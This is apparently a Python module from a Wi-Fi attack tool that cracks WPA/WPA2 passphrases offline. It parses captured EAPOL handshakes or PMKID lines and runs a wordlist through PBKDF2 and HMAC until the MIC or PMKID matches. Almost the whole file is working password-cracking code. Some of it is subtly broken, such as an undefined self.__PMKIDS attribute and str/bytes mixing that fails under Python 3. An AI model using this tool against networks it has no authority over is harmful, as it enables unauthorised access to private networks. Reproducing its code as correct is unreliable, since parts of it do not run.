import binascii
import hashlib
import hmac
import string
import sys
import time

from pbkdf2 import PBKDF2
from scapy.layers.dot11 import Dot11, Raw
from scapy.layers.eap import EAPOL
from scapy.utils import rdpcap

from utils import org


class CaptureHand:
    """Class for handling the capture of handshakes and related operations."""

    def __init__(
        self,
        pull,
        file_name,
        dictionary_file,
        essid,
        verbose,
    ):
        """
        Initialise the CaptureHand instance.

        :param pull: An instance of the util class to handle logging.
        :param file_name: The name of the pcap file to read.
        :param dictionary_file: The file path of the password dictionary.
        :param essid: The ESSID of the target.
        :param verbose: Boolean indicating verbosity mode.
        """
        self.verbose = verbose
        self.pull = pull
        self.essid = self.get_ess(essid)
        self.file = file_name
        self.passes = self.load_passwords(
            dictionary_file
        )
        self.pkts = self.read_packets(
            file_name
        )
        self.bssid = ""
        self.cl = ""
        self.policies = [0, 0, 0, 0]
        self.is_verified = False
        self.null_byte = b"\x00"

    def read_packets(self, file_name):
        """Read packets from the specified pcap file."""
        self.pull.up(
            f"Reading File: {self.pull.BLUE}{file_name}{self.pull.END}"
        )
        return rdpcap(file_name)

    def get_ess(self, essid):
        """Get the ESSID, or exit if not specified."""
        if essid:
            return essid
        else:
            self.pull.error(
                "SSID not specified. Please specify -e, --essid option for handshake."
            )
            sys.exit()

    def load_passwords(
        self, dictionary_file
    ):
        """Load passwords from the specified dictionary file."""
        with open(
            dictionary_file, "r"
        ) as file_:
            return [
                line.rstrip("\n")
                for line in file_.readlines()
            ]

    def hexdump(
        self, src, length=16, sep="."
    ):
        """Return a formatted hex dump of the given data."""
        display = (
            string.digits
            + string.ascii_letters
            + string.punctuation
        )
        filter_chars = "".join(
            (
                x if x in display else "."
                for x in map(chr, range(256))
            )
        )
        lines = []
        for c in range(0, len(src), length):
            chars = src[c : c + length]
            hex_view = " ".join(
                f"{ord(x):02x}"
                for x in chars
            )
            if len(hex_view) > 24:
                hex_view = f"{hex_view[:24]} {hex_view[24:]}"
            printable = "".join(
                filter_chars[ord(x)]
                for x in chars
            )
            lines.append(
                f"{c:08x}:  {hex_view:<{length * 3}}  |{printable}|\n"
            )
        return "".join(lines)

    def verify(self):
        """Verify the received captures."""
        self.pull.up(
            "Validating Received Captures..."
        )
        time.sleep(2)
        for pkt in self.pkts:
            self.check(pkt)
            if all(
                policy != 0
                for policy in self.policies
            ):
                self.is_verified = True
                break
        if self.is_verified:
            if self.verbose:
                self.pull.info(
                    f"EAPOL {self.bssid.replace(':', '').upper()} "
                    f"({self.pull.DARKCYAN}{org(self.bssid).org}{self.pull.END}) "
                    f"{self.pull.RED}<> {self.cl.replace(':', '').upper()} "
                    f"({self.pull.DARKCYAN}{org(self.cl).org}{self.pull.END}) "
                    f"{self.pull.YELLOW}[RECEIVED]{self.pull.END}"
                )
            else:
                self.pull.info(
                    f"EAPOL {self.bssid.replace(':', '').upper()} "
                    f"{self.pull.RED}<> {self.cl.replace(':', '').upper()} "
                    f"{self.pull.YELLOW}[RECEIVED]{self.pull.END}"
                )
            return True
        return False

    def check(self, pkt):
        """Check packets for valid handshakes."""
        fNONCE = "0000000000000000000000000000000000000000000000000000000000000000"
        fMIC = "00000000000000000000000000000000"

        if pkt.haslayer(EAPOL):
            __sn = pkt[Dot11].addr2
            __rc = pkt[Dot11].addr1
            to_DS = (
                pkt.getlayer(Dot11).FCfield
                & 0x1
                != 0
            )
            from_DS = (
                pkt.getlayer(Dot11).FCfield
                & 0x2
                != 0
            )

            if from_DS:
                nonce = binascii.hexlify(
                    pkt.getlayer(Raw).load
                )[26:90]
                mic = binascii.hexlify(
                    pkt.getlayer(Raw).load
                )[154:186]
                if (
                    nonce != fNONCE
                    and mic == fMIC
                ):
                    self.bssid = __sn
                    self.cl = __rc
                    self.policies[0] = pkt
                elif (
                    __sn == self.bssid
                    and __rc == self.cl
                    and nonce != fNONCE
                    and mic != fMIC
                ):
                    self.policies[2] = pkt
            elif to_DS:
                nonce = binascii.hexlify(
                    pkt.getlayer(Raw).load
                )[26:90]
                mic = binascii.hexlify(
                    pkt.getlayer(Raw).load
                )[154:186]
                if (
                    __sn == self.cl
                    and __rc == self.bssid
                    and nonce != fNONCE
                    and mic != fMIC
                ):
                    self.policies[1] = pkt
                elif (
                    __sn == self.cl
                    and __rc == self.bssid
                    and nonce == fNONCE
                    and mic != fMIC
                ):
                    self.policies[3] = pkt

    def print_current_password(
        self,
        previous_password,
        current_password,
    ):
        """Format the current password display based on previous password length."""
        len_a, len_b = (
            len(previous_password),
            len(current_password),
        )
        if len_a != 0:
            return (
                current_password
                + " " * (len_a - len_b)
                if len_a > len_b
                else current_password
            )
        return current_password

    def print_results(self):
        """Print the results of the cracking attempts."""
        time.sleep(2)
        if self.verbose:
            self.pull.up(
                f"Cracking {self.bssid.replace(':', '').upper()} "
                f"({self.pull.DARKCYAN}{org(self.bssid).org}{self.pull.END}) "
                f"{self.pull.RED}<> {self.cl.replace(':', '').upper()} "
                f"({self.pull.DARKCYAN}{org(self.cl).org}{self.pull.END}) "
                f"{self.pull.GREEN}[{self.essid}]{self.pull.END}"
            )
        else:
            self.pull.up(
                f"Cracking {self.bssid.replace(':', '').upper()} "
                f"{self.pull.RED}<> {self.cl.replace(':', '').upper()} "
                f"{self.pull.GREEN}[{self.essid}]{self.pull.END}"
            )

    def organise(self):
        """Prepare the necessary parameters for the cracking process."""
        self.print_results()
        self.bssid = binascii.a2b_hex(
            self.bssid.replace(
                ":", ""
            ).lower()
        )
        self.cl = binascii.a2b_hex(
            self.cl.replace(":", "").lower()
        )
        self.aNONCE = binascii.a2b_hex(
            binascii.hexlify(
                self.policies[0]
                .getlayer(Raw)
                .load
            )[26:90]
        )
        self.cNONCE = binascii.a2b_hex(
            binascii.hexlify(
                self.policies[1]
                .getlayer(Raw)
                .load
            )[26:90]
        )
        self.key_data = (
            min(self.bssid, self.cl)
            + max(self.bssid, self.cl)
            + min(self.aNONCE, self.cNONCE)
            + max(self.aNONCE, self.cNONCE)
        )
        self.mic = binascii.hexlify(
            self.policies[1]
            .getlayer(Raw)
            .load
        )[154:186]
        self.version = chr(
            self.policies[1]
            .getlayer(EAPOL)
            .version
        )
        self.type = chr(
            self.policies[1]
            .getlayer(EAPOL)
            .type
        )
        self.len = chr(
            self.policies[1]
            .getlayer(EAPOL)
            .len
        )

        self.payload = binascii.a2b_hex(
            binascii.hexlify(
                self.version
                + self.type
                + self.null_byte
                + self.len
                + binascii.a2b_hex(
                    binascii.hexlify(
                        self.policies[1]
                        .getlayer(Raw)
                        .load
                    )[:154]
                )
            )
            + self.null_byte * 16
            + binascii.a2b_hex(
                binascii.hexlify(
                    self.policies[1]
                    .getlayer(Raw)
                    .load
                )[186:]
            )
        )

    def custom_prf512(self, key, A, B):
        """Custom PRF for generating derived keys."""
        output_length = 64
        i = 0
        result = b""
        while i <= (
            (output_length * 8 + 159) // 160
        ):
            hmac_sha1 = hmac.new(
                key,
                A + b"\x00" + B + bytes([i]),
                hashlib.sha1,
            )
            i += 1
            result += hmac_sha1.digest()
        return result[:output_length]

    def loop(self):
        """Attempt to crack the passphrase using the loaded passwords."""
        last_pass = ""
        for current_pass in self.passes:
            self.pull.up(
                f"Current Password: {self.print_current_password(last_pass, current_pass)}"
            )
            last_pass = current_pass
            pmk = PBKDF2(
                current_pass,
                self.essid,
                4096,
            ).read(32)
            ptk = self.custom_prf512(
                pmk,
                b"Pairwise key expansion",
                self.key_data,
            )
            mic = hmac.new(
                ptk[0:16],
                self.payload,
                hashlib.md5,
            ).hexdigest()
            mic_ = hmac.new(
                ptk[0:16],
                self.payload,
                hashlib.sha1,
            ).hexdigest()[:32]
            if (
                self.mic == mic
                or self.mic == mic_
            ):
                self.pull.use(
                    f"CRACKED! Key Found {self.pull.GREEN}{current_pass}{self.pull.END}"
                )
                self.pull.right("PMK =>")
                print(self.hexdump(pmk))
                self.pull.right("PTK =>")
                print(self.hexdump(ptk))
                self.pull.right("MIC =>")
                print(
                    self.hexdump(
                        mic
                        if self.mic == mic
                        else mic_
                    )
                )
                return
            else:
                if (
                    current_pass
                    != self.passes[-1]
                ):
                    self.pull.lineup()


class CapturePMKID:
    """Class for handling the capture of PMKID and related operations."""

    def __init__(
        self,
        pull,
        file_name,
        dictionary_file,
        verbose,
    ):
        """
        Initialise the CapturePMKID instance.

        :param pull: An instance of the util class to handle logging.
        :param file_name: The name of the PMKID file to read.
        :param dictionary_file: The file path of the password dictionary.
        :param verbose: Boolean indicating verbosity mode.
        """
        self.verbose = verbose
        self.pull = pull
        self.file = file_name
        self.passes = self.load_passwords(
            dictionary_file
        )
        self.lines = self.read_lines(
            file_name
        )

    def hexdump(
        self, src, length=16, sep="."
    ):
        """Return a formatted hex dump of the given data."""
        display = (
            string.digits
            + string.ascii_letters
            + string.punctuation
        )
        filter_chars = "".join(
            (
                x if x in display else "."
                for x in map(chr, range(256))
            )
        )
        lines = []
        for c in range(0, len(src), length):
            chars = src[c : c + length]
            hex_view = " ".join(
                f"{ord(x):02x}"
                for x in chars
            )
            if len(hex_view) > 24:
                hex_view = f"{hex_view[:24]} {hex_view[24:]}"
            printable = "".join(
                filter_chars[ord(x)]
                for x in chars
            )
            lines.append(
                f"{c:08x}:  {hex_view:<{length * 3}}  |{printable}|\n"
            )
        return "".join(lines)

    def read_lines(self, file_name):
        """Read lines from the specified file."""
        with open(file_name, "r") as file_:
            return [
                line.rstrip("\n")
                for line in file_.readlines()
            ]

    def verify(self):
        """Verify the lines read from the PMKID captures."""
        if len(self.lines) <= 0:
            return False
        for line in self.lines:
            if len(line.split("*")) != 4:
                return False
        return True

    def hwaddr(self, addr):
        """Format hardware address for readability."""
        return ":".join(
            addr[i : i + 2]
            for i in range(0, 12, 2)
        )

    def load_passwords(
        self, dictionary_file
    ):
        """Load passwords from the specified dictionary file."""
        with open(
            dictionary_file, "r"
        ) as file_:
            return [
                line.rstrip("\n")
                for line in file_.readlines()
            ]

    def organise(self):
        """Process the collected PMKID information."""
        self.pull.up(
            "Validating Received Captures..."
        )
        for line in self.lines:
            pmk, ap, cl, ess = line.split(
                "*"
            )
            pmkid_data = (pmk, ap, cl, ess)
            if self.verbose:
                self.pull.info(
                    f"PMKID {ap.upper()} ({self.pull.DARKCYAN}{org(self.hwaddr(ap)).org}{self.pull.END}) "
                    f"{self.pull.RED}<> {cl.upper()} ({self.pull.DARKCYAN}{org(self.hwaddr(cl)).org}{self.pull.END}) "
                    f"{self.pull.YELLOW}[RECEIVED]{self.pull.END}"
                )
            else:
                self.pull.info(
                    f"PMKID {ap.upper()} {self.pull.RED}<> {cl.upper()} "
                    f"{self.pull.YELLOW}[RECEIVED]{self.pull.END}"
                )
            time.sleep(1)

    def print_current_password(
        self,
        previous_password,
        current_password,
    ):
        """Format the current password display based on the previous password length."""
        len_a, len_b = (
            len(previous_password),
            len(current_password),
        )
        if len_a != 0:
            return (
                current_password
                + " " * (len_a - len_b)
                if len_a > len_b
                else current_password
            )
        return current_password

    def loop(self):
        """Attempt to crack the PMKID using the loaded passwords."""
        time.sleep(2)
        for (
            pmk,
            ap,
            cl,
            ess,
        ) in self.__PMKIDS:
            if self.verbose:
                self.pull.up(
                    f"Cracking {ap.upper()} ({self.pull.DARKCYAN}{org(self.hwaddr(ap)).org}{self.pull.END}) "
                    f"{self.pull.RED}<> {cl.upper()} ({self.pull.DARKCYAN}{org(self.hwaddr(cl)).org}{self.pull.END}) "
                    f"{self.pull.GREEN}[{pmk.upper()}]{self.pull.END}"
                )
            else:
                self.pull.up(
                    f"Cracking {ap.upper()} {self.pull.RED}<> {cl.upper()} "
                    f"{self.pull.GREEN}[{pmk.upper()}]{self.pull.END}"
                )

            current_pass, pmk_value = (
                self.crack(pmk, ap, cl, ess)
            )
            if current_pass:
                self.pull.use(
                    f"CRACKED! Key Found {self.pull.GREEN}{current_pass}{self.pull.END}"
                )
                self.pull.right("PMK =>")
                print(
                    self.hexdump(pmk_value)
                )
                self.pull.right("PMKID =>")
                print(self.hexdump(pmk))
            else:
                self.pull.error(
                    "Not Found! Password not in Dictionary."
                )

    def crack(self, pmk_, ap_, cl_, ess_):
        """Attempt to crack the given PMKID."""
        last_pass = ""
        for current_pass in self.passes:
            self.pull.up(
                f"Currently Checking: {self.pull.BLUE}{self.print_current_password(last_pass, current_pass)}{self.pull.END}"
            )
            last_pass = current_pass
            pmk = PBKDF2(
                current_pass,
                binascii.unhexlify(ess_),
                4096,
            ).read(32)
            ap = binascii.a2b_hex(ap_)
            cl = binascii.a2b_hex(cl_)
            pmk_string = b"PMK Name"
            hash_value = hmac.new(
                pmk,
                pmk_string + ap + cl,
                hashlib.sha1,
            ).hexdigest()[:32]
            if hash_value == pmk_:
                return current_pass, pmk
            else:
                if (
                    current_pass
                    != self.passes[-1]
                ):
                    self.pull.lineup()
        return None, None
